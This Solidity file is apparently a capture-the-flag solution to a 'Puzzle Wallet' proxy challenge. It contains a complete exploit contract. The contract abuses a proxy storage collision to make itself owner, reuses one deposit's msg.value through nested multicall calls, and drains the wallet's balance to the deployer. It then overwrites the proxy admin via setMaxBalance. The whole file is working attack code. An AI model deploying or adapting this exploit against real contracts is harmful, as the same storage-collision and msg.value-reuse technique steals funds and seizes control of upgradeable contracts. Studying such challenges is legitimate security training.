// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface IPuzzleProxy {
    function proposeNewAdmin(address _newAdmin) external;
}

interface IPuzzleWallet {
    function addToWhitelist(address addr) external;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function deposit() external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract MultiCallExploit {

    address owner;

    constructor() {
        owner = msg.sender;
    }

    function executeMultiCall(address wallet) external payable {   
        require(msg.value == 0.001 ether, "Msg value not correct");

        bytes[] memory singleDeposit = new bytes[](1);
        singleDeposit[0] = abi.encodeWithSelector(IPuzzleWallet.deposit.selector);
        bytes[] memory arrayDeposit = new bytes[](2);
        arrayDeposit[0] = abi.encodeWithSelector(IPuzzleWallet.deposit.selector);
        arrayDeposit[1] = abi.encodeWithSelector(IPuzzleWallet.multicall.selector, singleDeposit);

        // Overwritte the owner of the contract and whitelist the caller
        IPuzzleProxy(wallet).proposeNewAdmin(address(this));
        IPuzzleWallet(wallet).addToWhitelist(address(this));

        // // Execute the deposit and multicall with deposit
        IPuzzleWallet(wallet).multicall{value: 0.001 ether}(arrayDeposit);

        // // Set contract balance to 0
        IPuzzleWallet(wallet).execute(address(this), 0.002 ether, "");

        // // Overwritte the admin
        IPuzzleWallet(wallet).setMaxBalance(uint256(uint160(msg.sender)));
    }

    receive() external payable {
        (bool success , ) =  owner.call{value: msg.value}("");
        require(success);
    }

}